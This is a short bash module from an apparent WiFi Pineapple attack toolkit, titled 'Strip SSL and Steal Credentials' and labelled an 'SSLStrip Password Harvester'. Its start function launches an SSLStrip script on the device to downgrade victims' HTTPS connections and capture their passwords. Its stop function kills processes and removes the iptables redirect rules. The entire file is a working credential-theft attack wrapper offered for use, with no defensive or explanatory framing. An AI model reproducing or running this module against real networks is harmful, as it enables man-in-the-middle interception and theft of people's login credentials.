#
# Strip SSL and Steal Credentials
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="SSLStrip"
# Create a description for menu
description="SSLStrip Password Harvester"
# Letter keys/commands to select item in menu
bindings='S|s'
#########################################

# Variables

# Start Function
function start_sslstrip(){
  echo -e "\e[01;34m[>]\e[00m Running SSLStrip Attack Vector..."
  echo -e "\e[01;34m[>]\e[00m Enabling SSLStrip on the pineapple.."
  command='bash /pineapple/components/infusions/sslstrip/includes/autostart.sh | at now &'
  pineapple_command
}

# Stop Function
function stop_sslstrip(){
  echo -e "\e[01;34m[>]\e[00m Stopping SSLStrip Attack Vector..."
  command='killall -9 python ; iptables -t nat -D PREROUTING 2 ; iptables -t nat -D PREROUTING 2 ; iptables -t nat -D PREROUTING 2'
  pineapple_command
}